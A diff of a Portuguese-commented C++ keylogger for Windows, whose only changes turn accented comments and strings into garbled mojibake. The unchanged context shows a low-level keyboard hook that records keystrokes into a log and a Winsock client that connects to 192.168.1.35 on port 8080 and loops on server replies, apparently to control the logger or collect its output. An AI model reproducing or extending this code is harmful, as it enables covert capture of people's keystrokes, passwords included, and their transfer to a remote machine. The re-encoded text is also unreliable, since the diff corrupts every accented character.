@@ -8,9 +8,9 @@
 #include <windows.h>
 #include <locale.h>
 
-//Declaração das variáveis, structs e classes:
+//DeclaraÃ§Ã£o das variÃ¡veis, structs e classes:
 
-	//Módulo de conexão:
+	//MÃ³dulo de conexÃ£o:
 const int wait_time_before_reconect = 15;
 int sResult = 0;
 std::string log = "";
@@ -60,12 +60,12 @@ LRESULT CALLBACK KBDHook(int nCode, WPARAM wParam, LPARAM lParam)
 			}else{
 				//Teclas especiais:
 				
-				//ç
+				//Ã§
 					if(s->vkCode == VK_OEM_1){
 						if(capital_state == true){
-							log += 'Ç';
+							log += 'Ã‡';
 						}else{
-							log += 'ç';
+							log += 'Ã§';
 						}
 					}
 			}
@@ -78,7 +78,7 @@ LRESULT CALLBACK KBDHook(int nCode, WPARAM wParam, LPARAM lParam)
 	
 }
 
-//Declaração das funções
+//DeclaraÃ§Ã£o das funÃ§Ãµes
 void connection();
 void k_log();
 void capital();
@@ -99,21 +99,21 @@ t_k_log.join();
 return 0;
 }
 
-//Implementação das funções:
+//ImplementaÃ§Ã£o das funÃ§Ãµes:
 void connection(){
 
 if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-std::cerr << "Falha na inicialização do Winsock" << std::endl;
+std::cerr << "Falha na inicializaÃ§Ã£o do Winsock" << std::endl;
 }
 if ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
-std::cerr << "Falha na criação do socket" << std::endl;
+std::cerr << "Falha na criaÃ§Ã£o do socket" << std::endl;
 WSACleanup();
 }
 serverAddress.sin_family = AF_INET;
 serverAddress.sin_port = htons(8080);
 serverAddress.sin_addr.s_addr = inet_addr("192.168.1.35");
 if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
-std::cerr << "Erro na conexão com o servidor" << std::endl;
+std::cerr << "Erro na conexÃ£o com o servidor" << std::endl;
 closesocket(clientSocket);
 WSACleanup();
 }
@@ -123,7 +123,7 @@ while(1){
 	memset(buffer, 0, 1024);
 	
 if (recv(clientSocket, buffer, sizeof(buffer), 0) < 0) {
-std::cerr << "Erro na recepção da resposta do servidor" << std::endl;
+std::cerr << "Erro na recepÃ§Ã£o da resposta do servidor" << std::endl;
 closesocket(clientSocket);
 WSACleanup();
 }
@@ -155,7 +155,7 @@ WSACleanup();
 
 void k_log(){
 	
-	//Criando o hook: (WH_KWYBOARD_LL é o tipo de hook; ll significa Low Level)
+	//Criando o hook: (WH_KWYBOARD_LL Ã© o tipo de hook; ll significa Low Level)
 	HHOOK kbd = SetWindowsHookEx(WH_KEYBOARD_LL, &KBDHook, 0, 0);
 	
 	MSG message;
